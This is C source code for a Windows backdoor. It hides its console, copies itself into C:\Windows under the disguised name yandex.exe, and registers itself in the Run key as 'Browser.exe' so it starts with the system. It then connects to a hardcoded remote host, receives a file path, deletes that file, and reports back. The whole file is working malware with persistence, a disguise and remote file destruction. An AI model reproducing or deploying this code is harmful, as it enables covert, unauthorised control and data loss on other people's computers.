// Made by Y.Sendov. March 2022

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_ERROR -1
#define DEFAULT_BUFLEN 256
#define DEFAULT_PORT "27015"
#define DEFAULT_IP "192.168.0.101"

void reg()
{
	HKEY hKey = NULL;
	wchar_t data[DEFAULT_BUFLEN];
	wcscpy(data, L"C:\\Windows\\yandex.exe");
	wchar_t way[DEFAULT_BUFLEN];
	GetModuleFileName(NULL, way, DEFAULT_BUFLEN); // Extracts the full access path to the executable file
	// Copies an existing file to a new file
	int copy = CopyFile(way, data, 0);
	if (copy == 0)
	{
		printf("File copying error!\n");
		int error = GetLastError();
	}
	LONG rc = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
	int len = wcslen(data) * 2;
	if (rc == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, L"Browser.exe", 0, REG_SZ, (LPBYTE)data, len); // Creates a parameter in the registry key
		RegCloseKey(hKey);
	}
	else printf("Error! The file was not added to the Windows Startup registry.\n");
}

int main()
{
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);

	FreeConsole(); // Detaching the calling process from the console
	reg();

	// Initializing Winsock
	WSADATA wsaData;

	// Initializing the Windows Sockets interface
	int Result;
	Result = WSAStartup(MAKEWORD(1, 1), &wsaData);
	if (Result != 0)
	{
		printf("Winsock initialization error!\n");
		return DEFAULT_ERROR;
	}

	// Socket Formation
	struct addrinfo* result = NULL; // Preparing the socket address structure
	struct addrinfo hints; // Socket type information
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC; // AF_UNSPEC - address family not specified AF_INET - IPv4
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	// Converting a hostname to an address
	Result = getaddrinfo(DEFAULT_IP, DEFAULT_PORT, &hints, &result); // IP address for connection, port
	if (Result != 0)
	{
		printf("Error! The getaddrinfo function failed.\n");
		WSACleanup();
		return DEFAULT_ERROR;
	}

	// Attempt to connect to the address
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* ptr = NULL;
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		// Creating a socket to connect to the server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET)
		{
			printf("Error! Failed to create a socket.\n");
			WSACleanup();
			return DEFAULT_ERROR;
		}
		// Connecting to the server
		Result = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (Result == SOCKET_ERROR)
		{
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET)
	{
		printf("Unable to connect to the server!\n");
		WSACleanup();
		return DEFAULT_ERROR;
	}

	char recvbuf[DEFAULT_BUFLEN];
	memset(recvbuf, 0, sizeof(recvbuf));
	Result = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	// Data transfer to the server socket
	int del = remove(recvbuf);
	if (del != 0) send(ConnectSocket, "An error has occurred! The file was not deleted.\n", 39, 0);
	else send(ConnectSocket, "The file was successfully deleted.\n", 26, 0);
	return 0;
}